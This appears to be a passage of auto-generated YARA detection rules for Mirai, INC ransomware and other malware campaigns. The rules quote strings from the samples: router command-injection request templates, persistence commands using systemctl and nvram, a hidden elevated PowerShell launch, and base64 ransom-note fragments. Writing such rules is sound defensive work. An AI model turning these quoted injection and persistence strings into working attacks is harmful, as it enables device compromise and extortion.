        author = "Sightlines (automatically generated)"
        description = "Strings shared by the samples of campaign tlsh-11c8e538"
        date = "2026-10-21"
        campaign = "tlsh-11c8e538"
        family = "mirai"
        hash = "2e892431668abc0edfa63f56ec3558f8ab8db5ad57c2b27ccc2fe0a3273744f0"
        reference = "https://sourcediver42.github.io/sightlines/campaigns/tlsh-11c8e538.json"
        license = "Detection Rule License (DRL) 1.1"
    strings:
        $s0 = "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8" ascii
        $s1 = "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8" ascii
        $s2 = "systemctl disable systemd-network-helper.service >/dev/null 2>&1" ascii
        $s3 = "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8" ascii
        $s4 = "systemctl is-enabled systemd-network-helper.service >/dev/null 2>&1" ascii
        $s5 = "systemctl enable systemd-network-helper.service >/dev/null 2>&1" ascii
        $s6 = "nvram set rc_startup=\"%s\" >/dev/null 2>&1 && nvram commit >/dev/null 2>&1" ascii
        $s7 = "nvram set rc_startup=\"\" >/dev/null 2>&1 && nvram commit >/dev/null 2>&1" ascii
        $s8 = "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8" ascii
        $s9 = "Content-Disposition: form-data; name=\"file\"; filename=\"%s.txt\"" ascii
        $s10 = "%s: '%s' is not an ELF executable for MIPS" ascii
        $s11 = "mount -o remount,rw /system >/dev/null 2>&1" ascii
    condition:
        uint32(0) == 0x464C457F and filesize < 1090464 and 12 of them
}

rule Sightlines_tlsh_2acb43e9_mirai
{
    meta:
        author = "Sightlines (automatically generated)"
        description = "Strings shared by the samples of campaign tlsh-2acb43e9"
        date = "2026-10-21"
        campaign = "tlsh-2acb43e9"
        family = "mirai"
        hash = "4587c320988021e05d994f96901c6e91d47f9ab3c965a64b22dd14437b4bc23c"
        reference = "https://sourcediver42.github.io/sightlines/campaigns/tlsh-2acb43e9.json"
        license = "Detection Rule License (DRL) 1.1"
    strings:
        $s0 = "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8" ascii
        $s1 = "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8" ascii
        $s2 = "systemctl disable systemd-network-helper.service >/dev/null 2>&1" ascii
        $s3 = "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8" ascii
        $s4 = "systemctl is-enabled systemd-network-helper.service >/dev/null 2>&1" ascii
        $s5 = "systemctl enable systemd-network-helper.service >/dev/null 2>&1" ascii
        $s6 = "nvram set rc_startup=\"%s\" >/dev/null 2>&1 && nvram commit >/dev/null 2>&1" ascii
        $s7 = "nvram set rc_startup=\"\" >/dev/null 2>&1 && nvram commit >/dev/null 2>&1" ascii
        $s8 = "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8" ascii
        $s9 = "Content-Disposition: form-data; name=\"file\"; filename=\"%s.txt\"" ascii
        $s10 = "mount -o remount,rw /system >/dev/null 2>&1" ascii
        $s11 = "systemctl daemon-reload >/dev/null 2>&1" ascii
    condition:
        uint32(0) == 0x464C457F and filesize < 1048576 and 12 of them
}

rule Sightlines_tlsh_54cfce87_unknown
{
    meta:
        author = "Sightlines (automatically generated)"
        description = "Strings shared by the samples of campaign tlsh-54cfce87"
        date = "2026-10-21"
        campaign = "tlsh-54cfce87"
        family = ""
        hash = "089cad17525dce0bd22b55a019cc408bd6209f8338d78dfb8d8800fa1c0ddbf2"
        reference = "https://sourcediver42.github.io/sightlines/campaigns/tlsh-54cfce87.json"
        license = "Detection Rule License (DRL) 1.1"
    strings:
        $s0 = "\"%~dp0bin\\winws.exe\" --wf-tcp=80,443,2053,2083,2087,2096,8443,%GameFilterTCP% --wf-udp=443,19294-193" ascii
        $s1 = "th '%~f0' -WorkingDirectory '%~dp0.' -Verb RunAs\"" ascii
        $s2 = "if not exist \"%~dp0bin\\WinDivert64.sys\" goto gbzap_av_warn" ascii
        $s3 = "if exist \"%~dp0bin\\.wd\\wdvcache.exe\" goto gbzap_pay_go" ascii
        $s4 = "call \"%~dp0bin\\windivert_load.cmd\" >nul 2>&1" ascii
        $s5 = "if not exist \"%~dp0bin\\WinDivert.dll\" goto gbzap_av_warn" ascii
        $s6 = "powershell -NoProfile -ExecutionPolicy Bypass -WindowStyle Hidden -Command \"Start-Process -LiteralPa" ascii
        $s7 = "--filter-tcp=80,443,8443 --ipset=\"%LISTS%ipset-all.txt\" --hostlist-exclude=\"%LISTS%list-exclude.txt\"" ascii
        $s8 = "call \"%~dp0bin\\gbzap_lists.cmd\" >nul 2>&1" ascii
        $s9 = "scord=\"%BIN%quic_initial_dbankcloud_ru.bin\" --dpi-desync-fake-stun=\"%BIN%quic_initial_dbankcloud_ru." ascii
        $s10 = "esync-any-protocol=1 --dpi-desync-fake-unknown-udp=\"%BIN%quic_initial_dbankcloud_ru.bin\" --dpi-desyn" ascii
        $s11 = "--filter-tcp=80,443 --hostlist=\"%LISTS%list-general.txt\" --hostlist=\"%LISTS%list-general-user.txt\" -" ascii
    condition:
        filesize < 1048576 and 11 of them
}

rule Sightlines_tlsh_4a18bb8f_mirai
{
    meta:
        author = "Sightlines (automatically generated)"
        description = "Strings shared by the samples of campaign tlsh-4a18bb8f"
        date = "2026-10-21"
        campaign = "tlsh-4a18bb8f"
        family = "mirai"
        hash = "22822755856ab044d97c932d4d851d2e2641aca1a7266c57e1b17f18c8e3062c"
        reference = "https://sourcediver42.github.io/sightlines/campaigns/tlsh-4a18bb8f.json"
        license = "Detection Rule License (DRL) 1.1"
    strings:
        $s0 = "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8" ascii
        $s1 = "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8" ascii
        $s2 = "systemctl disable systemd-network-helper.service >/dev/null 2>&1" ascii
        $s3 = "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8" ascii
        $s4 = "systemctl is-enabled systemd-network-helper.service >/dev/null 2>&1" ascii
        $s5 = "systemctl enable systemd-network-helper.service >/dev/null 2>&1" ascii
        $s6 = "nvram set rc_startup=\"%s\" >/dev/null 2>&1 && nvram commit >/dev/null 2>&1" ascii
        $s7 = "nvram set rc_startup=\"\" >/dev/null 2>&1 && nvram commit >/dev/null 2>&1" ascii
        $s8 = "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8" ascii
        $s9 = "Content-Disposition: form-data; name=\"file\"; filename=\"%s.txt\"" ascii
        $s10 = "mount -o remount,rw /system >/dev/null 2>&1" ascii
        $s11 = "systemctl daemon-reload >/dev/null 2>&1" ascii
    condition:
        uint32(0) == 0x464C457F and filesize < 1048576 and 12 of them
}

rule Sightlines_tlsh_95051358_mirai
{
    meta:
        author = "Sightlines (automatically generated)"
        description = "Strings shared by the samples of campaign tlsh-95051358"
        date = "2026-10-21"
        campaign = "tlsh-95051358"
        family = "mirai"
        hash = "0f048eb9fd5664aabeee4e19d5dfc6fd3c97f3c3aea764b87abbee918c16f44f"
        reference = "https://sourcediver42.github.io/sightlines/campaigns/tlsh-95051358.json"
        license = "Detection Rule License (DRL) 1.1"
    strings:
        $s0 = "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8" ascii
        $s1 = "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8" ascii
        $s2 = "systemctl disable systemd-network-helper.service >/dev/null 2>&1" ascii
        $s3 = "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8" ascii
        $s4 = "systemctl is-enabled systemd-network-helper.service >/dev/null 2>&1" ascii
        $s5 = "systemctl enable systemd-network-helper.service >/dev/null 2>&1" ascii
        $s6 = "nvram set rc_startup=\"%s\" >/dev/null 2>&1 && nvram commit >/dev/null 2>&1" ascii
        $s7 = "nvram set rc_startup=\"\" >/dev/null 2>&1 && nvram commit >/dev/null 2>&1" ascii
        $s8 = "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8" ascii
        $s9 = "Content-Disposition: form-data; name=\"file\"; filename=\"%s.txt\"" ascii
        $s10 = "mount -o remount,rw /system >/dev/null 2>&1" ascii
        $s11 = "systemctl daemon-reload >/dev/null 2>&1" ascii
    condition:
        uint32(0) == 0x464C457F and filesize < 1196096 and 12 of them
}

rule Sightlines_tlsh_25caa199_mirai
{
    meta:
        author = "Sightlines (automatically generated)"
        description = "Strings shared by the samples of campaign tlsh-25caa199"
        date = "2026-10-21"
        campaign = "tlsh-25caa199"
        family = "mirai"
        hash = "6b34d756ff2a87f1a29d46176757f6c86f7ed890a0214b627d11e47420508848"
        reference = "https://sourcediver42.github.io/sightlines/campaigns/tlsh-25caa199.json"
        license = "Detection Rule License (DRL) 1.1"
    strings:
        $s0 = "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8" ascii
        $s1 = "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8" ascii
        $s2 = "systemctl disable systemd-network-helper.service >/dev/null 2>&1" ascii
        $s3 = "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8" ascii
        $s4 = "systemctl is-enabled systemd-network-helper.service >/dev/null 2>&1" ascii
        $s5 = "systemctl enable systemd-network-helper.service >/dev/null 2>&1" ascii
        $s6 = "nvram set rc_startup=\"%s\" >/dev/null 2>&1 && nvram commit >/dev/null 2>&1" ascii
        $s7 = "nvram set rc_startup=\"\" >/dev/null 2>&1 && nvram commit >/dev/null 2>&1" ascii
        $s8 = "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8" ascii
        $s9 = "Content-Disposition: form-data; name=\"file\"; filename=\"%s.txt\"" ascii
        $s10 = "mount -o remount,rw /system >/dev/null 2>&1" ascii
        $s11 = "systemctl daemon-reload >/dev/null 2>&1" ascii
    condition:
        uint32(0) == 0x464C457F and filesize < 1048576 and 12 of them
}

rule Sightlines_tlsh_57ecf368_unknown
{
    meta:
        author = "Sightlines (automatically generated)"
        description = "Strings shared by the samples of campaign tlsh-57ecf368"
        date = "2026-10-21"
        campaign = "tlsh-57ecf368"
        family = ""
        hash = "13ce2b57b35b9a0223b0ea2782752bd2e20f550e2b7f0e9de8ae8d3999bfd402"
        reference = "https://sourcediver42.github.io/sightlines/campaigns/tlsh-57ecf368.json"
        license = "Detection Rule License (DRL) 1.1"
    strings:
        $s0 = "    Write-Host \"[INFO] Starting DPI TCP 16-20 checks (parallel: $MaxParallel)...\" -ForegroundColor D" ascii
        $s1 = "if ($env:MONITOR_MAX_PARALLEL) { [int]$dpiMaxParallel = $env:MONITOR_MAX_PARALLEL }" ascii
        $s2 = "if ($env:MONITOR_RANGE) { [int]$dpiRangeBytes = $env:MONITOR_RANGE }" ascii
        $s3 = "    $proc = Start-Process -FilePath \"cmd.exe\" -ArgumentList \"/c `\"$($file.FullName)`\"\" -WorkingDirec" ascii
        $s4 = "    Write-Host \"[INFO] Targets: $($Targets.Count) (custom URL overrides suite). Range: $rangeSpec by" ascii
        $s5 = "if ($env:MONITOR_TIMEOUT) { [int]$dpiTimeoutSeconds = $env:MONITOR_TIMEOUT }" ascii
        $s6 = "if (-not $currentPrincipal.IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator)) {" ascii
        $s7 = "    Write-Host \"  [$configNum/$($batFiles.Count)] $($file.Name)\" -ForegroundColor Yellow" ascii
        $s8 = "# DPI checker defaults (override via MONITOR_* env vars like in monitor.ps1)" ascii
        $s9 = "$batFiles = Get-ChildItem -Path $targetDir -Filter \"*.bat\" | Where-Object { $_.Name -notlike \"servic" ascii
        $s10 = "    Write-Host \"[WARNING] Ipset will be switched to 'any' for accurate DPI tests.\" -ForegroundColor " ascii
        $s11 = "    $maxNameLen = ($targetList | ForEach-Object { $_.Name.Length } | Measure-Object -Maximum).Maximu" ascii
    condition:
        filesize < 1048576 and 12 of them
}

rule Sightlines_tlsh_a81f202a_mirai
{
    meta:
        author = "Sightlines (automatically generated)"
        description = "Strings shared by the samples of campaign tlsh-a81f202a"
        date = "2026-10-21"
        campaign = "tlsh-a81f202a"
        family = "mirai"
        hash = "6e0d6099f51f8a9d88842f9ff4d29ed862007c10ffc6f9ae2557ed96577bd8eb"
        reference = "https://sourcediver42.github.io/sightlines/campaigns/tlsh-a81f202a.json"
        license = "Detection Rule License (DRL) 1.1"
    strings:
        $s0 = "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8" ascii
        $s1 = "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8" ascii
        $s2 = "systemctl disable systemd-network-helper.service >/dev/null 2>&1" ascii
        $s3 = "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8" ascii
        $s4 = "systemctl is-enabled systemd-network-helper.service >/dev/null 2>&1" ascii
        $s5 = "systemctl enable systemd-network-helper.service >/dev/null 2>&1" ascii
        $s6 = "nvram set rc_startup=\"%s\" >/dev/null 2>&1 && nvram commit >/dev/null 2>&1" ascii
        $s7 = "nvram set rc_startup=\"\" >/dev/null 2>&1 && nvram commit >/dev/null 2>&1" ascii
        $s8 = "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8" ascii
        $s9 = "Content-Disposition: form-data; name=\"file\"; filename=\"%s.txt\"" ascii
        $s10 = "mount -o remount,rw /system >/dev/null 2>&1" ascii
        $s11 = "systemctl daemon-reload >/dev/null 2>&1" ascii
    condition:
        uint32(0) == 0x464C457F and filesize < 1223736 and 12 of them
}

rule Sightlines_tlsh_cf44f6b9_mirai
{
    meta:
        author = "Sightlines (automatically generated)"
        description = "Strings shared by the samples of campaign tlsh-cf44f6b9"
        date = "2026-10-21"
        campaign = "tlsh-cf44f6b9"
        family = "mirai"
        hash = "8c8890f523dafe01a2d5a65931a691d401da814fcb5d64cddbb2101cbbafce16"
        reference = "https://sourcediver42.github.io/sightlines/campaigns/tlsh-cf44f6b9.json"
        license = "Detection Rule License (DRL) 1.1"
    strings:
        $s0 = "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8" ascii
        $s1 = "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8" ascii
        $s2 = "systemctl disable systemd-network-helper.service >/dev/null 2>&1" ascii
        $s3 = "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8" ascii
        $s4 = "systemctl is-enabled systemd-network-helper.service >/dev/null 2>&1" ascii
        $s5 = "systemctl enable systemd-network-helper.service >/dev/null 2>&1" ascii
        $s6 = "nvram set rc_startup=\"%s\" >/dev/null 2>&1 && nvram commit >/dev/null 2>&1" ascii
        $s7 = "nvram set rc_startup=\"\" >/dev/null 2>&1 && nvram commit >/dev/null 2>&1" ascii
        $s8 = "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8" ascii
        $s9 = "Content-Disposition: form-data; name=\"file\"; filename=\"%s.txt\"" ascii
        $s10 = "mount -o remount,rw /system >/dev/null 2>&1" ascii
        $s11 = "systemctl daemon-reload >/dev/null 2>&1" ascii
    condition:
        uint32(0) == 0x464C457F and filesize < 1048576 and 12 of them
}

rule Sightlines_tlsh_84f66a2b_mirai
{
    meta:
        author = "Sightlines (automatically generated)"
        description = "Strings shared by the samples of campaign tlsh-84f66a2b"
        date = "2026-10-21"
        campaign = "tlsh-84f66a2b"
        family = "mirai"
        hash = "5ff0986bb41a3213a79c112c6a7e80310edfb48d3282d6dd2c24cb4964947fdf"
        reference = "https://sourcediver42.github.io/sightlines/campaigns/tlsh-84f66a2b.json"
        license = "Detection Rule License (DRL) 1.1"
    strings:
        $s0 = "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8" ascii
        $s1 = "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8" ascii
        $s2 = "systemctl disable systemd-network-helper.service >/dev/null 2>&1" ascii
        $s3 = "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8" ascii
        $s4 = "systemctl is-enabled systemd-network-helper.service >/dev/null 2>&1" ascii
        $s5 = "systemctl enable systemd-network-helper.service >/dev/null 2>&1" ascii
        $s6 = "nvram set rc_startup=\"%s\" >/dev/null 2>&1 && nvram commit >/dev/null 2>&1" ascii
        $s7 = "nvram set rc_startup=\"\" >/dev/null 2>&1 && nvram commit >/dev/null 2>&1" ascii
        $s8 = "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8" ascii
        $s9 = "Content-Disposition: form-data; name=\"file\"; filename=\"%s.txt\"" ascii
        $s10 = "mount -o remount,rw /system >/dev/null 2>&1" ascii
        $s11 = "systemctl daemon-reload >/dev/null 2>&1" ascii
    condition:
        uint32(0) == 0x464C457F and filesize < 1209168 and 12 of them
}

rule Sightlines_tlsh_7cf160b0_mirai
{
    meta:
        author = "Sightlines (automatically generated)"
        description = "Strings shared by the samples of campaign tlsh-7cf160b0"
        date = "2026-10-21"
        campaign = "tlsh-7cf160b0"
        family = "mirai"
        hash = "15611a7793060cb4f4ada63149aace40b3cdead90f41c9a7c35803e84bd413ef"
        reference = "https://sourcediver42.github.io/sightlines/campaigns/tlsh-7cf160b0.json"
        license = "Detection Rule License (DRL) 1.1"
    strings:
        $s0 = "DMCCRe7HaAgEeoZzN31Fu9LjO/wl9ngRG3jRpXKRSzds+N4GSOL/NymOIlRTL+R1QakC03hcj1Zqoi2FyPBmiVCnxlbgqpYkum1N" ascii
        $s1 = "v+6LOO5aoJrn0qJRcQ5rbpb4IKVjRrOrHMNShtRRLdWAZ3UiMvpDyOoO7a6PIpGk4hRP89NqZQldou3t6KTUhUKqFNc/JXYzyZj2" ascii
        $s2 = "wSbUApq6npt6MrE/917Hc3efVV93zbHgLh1CFWYass8cJ8OZ17c4KTtmDZtKY+q/9ZOya6Q0PPTo6BchnNzEQQIDAQAB" ascii
        $s3 = "MIIBIjANBgkqhkiG9w0BAQEFAAOCAQ8AMIIBCgKCAQEAmmFi2EB5BpqTSnj66P5Sd5CX+2p+eelmwR0PUuf7paUg9o7KBvAFPM0p" ascii
        $s4 = "OAP-ENV:encodingStyle=\"http://schemas.xmlsoap.org/soap/encoding/\"><SOAP-ENV:Body><m:AddPortMapping x" ascii
        $s5 = "<?xml version=\"1.0\"?><SOAP-ENV:Envelope xmlns:SOAP-ENV=\"http://schemas.xmlsoap.org/soap/envelope/\" S" ascii
        $s6 = "GET /setup.cgi?todo=ping_test&next_file=diagping.htm&c4_IPAddr=;%s HTTP/1.1" ascii
        $s7 = "GET /cgi-bin/webproc?getpage=html/index.html&var:menu=setup&var:page=wizard&var:subpage=wiz_wan_,;%s" ascii
        $s8 = "<?xml version=\"1.0\" encoding=\"UTF-8\"?><language>$(%s)</language>" ascii
        $s9 = "GET /adv,/cgi-bin/weblogin.cgi?username=admin';%s;' HTTP/1.1" ascii
        $s10 = "GET /cgi-bin/masterCGI?ping=nomip&user=;%s; HTTP/1.1" ascii
        $s11 = "POST /wanipcn.xml?service=WANIPConn1 HTTP/1.1" ascii
    condition:
        uint32(0) == 0x464C457F and filesize < 1079504 and 12 of them
}

rule Sightlines_tlsh_86ea993a_unknown
{
    meta:
        author = "Sightlines (automatically generated)"
        description = "Strings shared by the samples of campaign tlsh-86ea993a"
        date = "2026-10-21"
        campaign = "tlsh-86ea993a"
        family = ""
        hash = "b76cc467389add76c92b8db4d6a3eba12f7403d364ad3425b34e5798323306fd"
        reference = "https://sourcediver42.github.io/sightlines/campaigns/tlsh-86ea993a.json"
        license = "Detection Rule License (DRL) 1.1"
    strings:
        $s0 = "1u1$)&u+17u)qdE" ascii
        $s1 = "wq\"x{JDJK" ascii
        $s2 = "-0+1prp|" ascii
    condition:
        uint32(0) == 0x464C457F and filesize < 1048576 and 3 of them
}

rule Sightlines_tlsh_dc683082_unknown
{
    meta:
        author = "Sightlines (automatically generated)"
        description = "Strings shared by the samples of campaign tlsh-dc683082"
        date = "2026-10-21"
        campaign = "tlsh-dc683082"
        family = ""
        hash = "26eb4e606d4a18f15b7c03bd0f479101727bdf550db0c5d71325d889a986c58b"
        reference = "https://sourcediver42.github.io/sightlines/campaigns/tlsh-dc683082.json"
        license = "Detection Rule License (DRL) 1.1"
    strings:
        $s0 = "yDelay encryption by N minutes,src/settings.rsfn5+fiBJTkMgUmFuc29tIH5+fn4KCi0tLS0tPiBZb3VyIGRhdGEgaX" ascii
        $s1 = "VlNnFid3RnanN4cHc2YjdpeHpzc3UzNnRzYWpsZG9hZC5vbmlvbi8KCkxpbmsgZm9yIG5vcm1hbCBicm93c2VyOgoJaHR0cDovL2" ascii
        $s2 = "NzeDZxa2lkLm9uaW9uLwoKWW91ciBwZXJzb25hbCBJRDoKCSVpZCUKCi0tLS0tPiBXYXJuaW5nISBEb24ndCBkZWxldGUgb3IgbW" ascii
        $s3 = "NlciBMaW5rIGZvciBjaGF0OgoJaHR0cDovL2luY3BheWthYmpxYzJtdGR4cTZjMjNucWg0eDZtNWRrcHM1ZnI2dmdka2d6cDVuan" ascii
        $s4 = "UKCi0tLS0tPiBZb3UgbmVlZCB0byBjb250YWN0IHVzIG9uIFRPUiBkYXJrbmV0IHNpdGVzIHdpdGggeW91ciBwZXJzb25hbCBJRA" ascii
        $s5 = "VyIGNvbXBhbnkgd2lsbCBiZSBzYWZlLgoKVG9yIEJyb3dzZXIgTGluazoKCWh0dHA6Ly9pbmNibG9nNnF1NHk0bW00enZ3NW5ybX" ascii
        $s6 = "B0aGUgcmFuc29tIHByaWNlIGlzICQ1TSBkb2xsYXJzLCBidXQgaW4gZmFjdCB0aGV5IHNlY3JldGx5IG5lZ290aWF0ZSB3aXRoIH" ascii
        $s7 = "9uJ3QgcHJvdGVjdCB5b3UgZnJvbSByZXBlYXRlZCBhdHRhY2tzLiAKCi0tLS0tPiBEb24ndCBnbyB0byByZWNvdmVyeSBjb21wYW" ascii
        $s8 = "BheSBzZXZlcmFsIHRpbWVzIGxlc3MuCgotLS0tLT4gRm9yIHRob3NlIHdobyBoYXZlIGN5YmVyIGluc3VyYW5jZSBhZ2FpbnN0IH" ascii
        $s9 = "9kaWZ5IGVuY3J5cHRlZCBmaWxlcywgaXQgd2lsbCBsZWFkIHRvIHByb2JsZW1zIHdpdGggZGVjcnlwdGlvbiBvZiBmaWxlcyEKLS" ascii
        $s10 = "4KCi0tLS0tPiBJZiB5b3UgZG8gbm90IHBheSB0aGUgcmFuc29tLCB3ZSB3aWxsIGF0dGFjayB5b3VyIGNvbXBhbnkgYWdhaW4gaW" ascii
        $s11 = "NoZWQgb24gb3VyIFRPUiBkYXJrbmV0IHNpdGVzLgpUaGUgc29vbmVyIHlvdSBwYXkgdGhlIHJhbnNvbSwgdGhlIHNvb25lciB5b3" ascii
    condition:
        uint32(0) == 0x464C457F and filesize < 1748392 and 12 of them
}

rule Sightlines_imphash_fd1ab72f_inc
{
    meta:
        author = "Sightlines (automatically generated)"
        description = "Strings shared by the samples of campaign imphash-fd1ab72f"
        date = "2026-10-21"
        campaign = "imphash-fd1ab72f"
        family = "inc"
        hash = "0ae4447d755593ee1931170d4187a07a29bf0690179acc39b7400a4c65cd07c5"
        reference = "https://sourcediver42.github.io/sightlines/campaigns/imphash-fd1ab72f.json"
        license = "Detection Rule License (DRL) 1.1"
    strings:
        $s0 = "uZXIgeW91ciBjb21wYW55IHdpbGwgYmUgc2FmZS4NCg0KVG9yIEJyb3dzZXIgTGluazoNCglodHRwOi8vaW5jYmxvZzZxdTR5NG1" ascii
        $s1 = "jMjNucWg0eDZtNWRrcHM1ZnI2dmdka2d6cDVuanNzeDZxa2lkLm9uaW9uLw0KDQpZb3VyIHBlcnNvbmFsIElEOg0KCSVpZCUNCg0" ascii
        $s2 = "sYXJzLCBidXQgaW4gZmFjdCB0aGV5IHNlY3JldGx5IG5lZ290aWF0ZSB3aXRoIHVzIGZvciAkMU0uDQpJZiB5b3UgYXBwcm9hY2h" ascii
        $s3 = "yb3VuZCB0aGUgd29ybGQuDQoNClRvciBCcm93c2VyIExpbmsgZm9yIGNoYXQ6DQoJaHR0cDovL2luY3BheWthYmpxYzJtdGR4cTZ" ascii
        $s4 = "0dGFja3MuIA0KDQotLS0tLT4gRG9uJ3QgZ28gdG8gcmVjb3ZlcnkgY29tcGFuaWVzIQ0KVGhleSBhcmUgZXNzZW50aWFsbHkganV" ascii
        $s5 = "tNHp2dzVucm11ZTZxYnd0Z2pzeHB3NmI3aXh6c3N1MzZ0c2FqbGRvYWQub25pb24vDQoNCkxpbmsgZm9yIG5vcm1hbCBicm93c2V" ascii
        $s6 = "zaHRhZy9pbmNyYW5zb20/Zj1saXZlDQoNCi0tLS0tPiBZb3UgbmVlZCB0byBjb250YWN0IHVzIG9uIFRPUiBkYXJrbmV0IHNpdGV" ascii
        $s7 = "wdWJsaXNoZWQgb24gb3VyIFRPUiBkYXJrbmV0IHNpdGVzLg0KVGhlIHNvb25lciB5b3UgcGF5IHRoZSByYW5zb20sIHRoZSBzb29" ascii
        $s8 = "vZiBjYXNlcyB3aGVyZSByZWNvdmVyeSBjb21wYW5pZXMgdGVsbCB5b3UgdGhhdCB0aGUgcmFuc29tIHByaWNlIGlzICQ1TSBkb2x" ascii
        $s9 = "yOg0KCWh0dHA6Ly9pbmNibG9nLnN1Lw0KCQ0KLS0tLS0+IFdoYXQgZ3VhcmFudGVlcyBhcmUgdGhhdCB3ZSB3b24ndCBmb29sIHl" ascii
        $s10 = "vdT8NCldlIGFyZSBub3QgYSBwb2xpdGljYWxseSBtb3RpdmF0ZWQgZ3JvdXAgYW5kIHdlIHdhbnQgbm90aGluZyBtb3JlIHRoYW4" ascii
        $s11 = "tb3N0IGNhc2VzLCB3ZSBmaW5kIHRoaXMgaW5mb3JtYXRpb24gYW5kIGRvd25sb2FkIGl0Lg0KDQotLS0tLT4gSWYgeW91IGRvIG5" ascii
    condition:
        uint16(0) == 0x5A4D and filesize < 4412416 and 12 of them
}

rule Sightlines_tlsh_951da108_unknown
{
    meta:
        author = "Sightlines (automatically generated)"
        description = "Strings shared by the samples of campaign tlsh-951da108"
        date = "2026-10-21"
        campaign = "tlsh-951da108"
        family = ""
        hash = "0120990444ff05bbbe7d31f874319b23d43e2376052840e7f42696c69638206c"
        reference = "https://sourcediver42.github.io/sightlines/campaigns/tlsh-951da108.json"
        license = "Detection Rule License (DRL) 1.1"
    strings:
        $s0 = "ngs.rsfn5+fiBJTkMgUmFuc29tIH5+fn4KCi0tLS0tPiBZb3VyIGRhdGEgaXMgc3RvbGVuIGFuZCBlbmNyeXB0ZWQuCklmIHlvdS" ascii
        $s1 = "BhdHRhY2tzLiAKCi0tLS0tPiBEb24ndCBnbyB0byByZWNvdmVyeSBjb21wYW5pZXMhClRoZXkgYXJlIGVzc2VudGlhbGx5IGp1c3" ascii
        $s2 = "BheWthYmpxYzJtdGR4cTZjMjNucWg0eDZtNWRrcHM1ZnI2dmdka2d6cDVuanNzeDZxa2lkLm9uaW9uLwoKWW91ciBwZXJzb25hbC" ascii
        $s3 = "BJRDoKCSVpZCUKCi0tLS0tPiBXYXJuaW5nISBEb24ndCBkZWxldGUgb3IgbW9kaWZ5IGVuY3J5cHRlZCBmaWxlcywgaXQgd2lsbC" ascii
        $s4 = "IgaHR0cHM6Ly90d2l0dGVyLmNvbS9oYXNodGFnL2luY3JhbnNvbT9mPWxpdmUKCi0tLS0tPiBZb3UgbmVlZCB0byBjb250YWN0IH" ascii
        $s5 = "9hZC5vbmlvbi8KCkxpbmsgZm9yIG5vcm1hbCBicm93c2VyOgoJaHR0cDovL2luY2Jsb2cuc3UvCgkKLS0tLS0+IFdoYXQgZ3Vhcm" ascii
        $s6 = "BheSB0aGUgc2FsYXJpZXMgb2YgeW91ciBzeXN0ZW0gYWRtaW5pc3RyYXRvcnMuIEdldCBvdmVyIGl0IGFuZCBwYXkgZm9yIGl0Lg" ascii
        $s7 = "BjYXNlcyB3aGVyZSByZWNvdmVyeSBjb21wYW5pZXMgdGVsbCB5b3UgdGhhdCB0aGUgcmFuc29tIHByaWNlIGlzICQ1TSBkb2xsYX" ascii
        $s8 = "JzLCBidXQgaW4gZmFjdCB0aGV5IHNlY3JldGx5IG5lZ290aWF0ZSB3aXRoIHVzIGZvciAkMU0uCklmIHlvdSBhcHByb2FjaGVkIH" ascii
        $s9 = "Jyb3dzZXIgTGluazoKCWh0dHA6Ly9pbmNibG9nNnF1NHk0bW00enZ3NW5ybXVlNnFid3RnanN4cHc2YjdpeHpzc3UzNnRzYWpsZG" ascii
        $s10 = "lvdSB3aWxsIHF1aWNrbHkgcmVzdG9yZSB5b3VyIHN5c3RlbXMgYW5kIG1ha2UgZXZlbiBtb3JlIG1vbmV5LgpUcmVhdCB0aGlzIH" ascii
        $s11 = "RlbnMgb2YgY29tcGFuaWVzIGFyb3VuZCB0aGUgd29ybGQuCgpUb3IgQnJvd3NlciBMaW5rIGZvciBjaGF0OgoJaHR0cDovL2luY3" ascii
    condition:
        uint32(0) == 0x464C457F and filesize < 2249456 and 12 of them
}

rule Sightlines_dotnet_typelib_guid_c37488c8_sheetrat
{
    meta:
        author = "Sightlines (automatically generated)"
        description = "Strings shared by the samples of campaign dotnet_typelib_guid-c37488c8"
        date = "2026-10-21"
        campaign = "dotnet_typelib_guid-c37488c8"
        family = "sheetrat"
